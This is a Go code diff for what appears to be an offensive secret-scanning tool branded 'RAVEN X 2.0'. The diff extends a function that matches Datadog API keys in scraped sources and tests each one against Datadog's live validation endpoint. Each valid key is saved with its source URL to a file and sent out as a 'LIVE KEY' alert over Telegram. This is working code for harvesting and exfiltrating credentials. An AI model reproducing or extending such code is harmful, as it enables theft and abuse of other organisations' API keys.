@@ -1,19 +1,27 @@
 package main
 
 import (
+	"context"
+	"fmt"
 	"net/http"
 	"regexp"
+	"time"
 )
 
-// Datadog API keys are 32-char lowercase hex. The validation endpoint
-// is /api/v1/validate which checks the key via the DD-API-KEY header.
-// Returns 200 on valid, 403 on invalid.
 var datadogPattern = regexp.MustCompile(`(?i)(?:datadog|DD)[_-]?(?:api[_-]?)?key["'\s:=]+([a-f0-9]{32})`)
 
-// CheckDatadog validates a Datadog API key against the /validate endpoint.
-// 200 = key is valid for the org; anything else = not confirmed.
-// Uses do429Retry for rate-limit resilience.
 func (a *AWSScanner) CheckDatadog(key, sourceURL string) bool {
+	if !a.Config.APIValidation.Datadog {
+		return false
+	}
+	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
+		return false
+	}
+
+	globalCounters.mu.Lock()
+	globalCounters.APIsFoundTotal++
+	globalCounters.mu.Unlock()
+
 	req, err := http.NewRequest("GET", "https://api.datadoghq.com/api/v1/validate", nil)
 	if err != nil {
 		return false
@@ -21,10 +29,35 @@ func (a *AWSScanner) CheckDatadog(key, sourceURL string) bool {
 	req.Header.Set("Accept", "application/json")
 	req.Header.Set("DD-API-KEY", key)
 
-	resp, err := do429Retry(httpClient, req, 3)
+	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
+	defer cancel()
+	req = req.WithContext(ctx)
+
+	resp, err := do429Retry(client, req, 3)
 	if err != nil || resp == nil {
 		return false
 	}
 	defer resp.Body.Close()
-	return resp.StatusCode == 200
+
+	if resp.StatusCode != 200 {
+		return false
+	}
+
+	a.logValid("Datadog", fmt.Sprintf("Key: %s", key))
+	a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "valid_datadog.txt")
+	a.storeValidKeyLimit("Datadog", key, "")
+
+	globalCounters.mu.Lock()
+	globalCounters.APIsValidated++
+	globalCounters.mu.Unlock()
+
+	msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
+━━━━━━━━━━━━━━━━━━
+🐶 <b>DATADOG LIVE KEY</b>
+
+🔑 <b>Key:</b> <code>%s</code>
+🔗 <b>Source:</b> %s
+`, key, sourceURL)
+	go a.sendTelegram(msg)
+	return true
 }
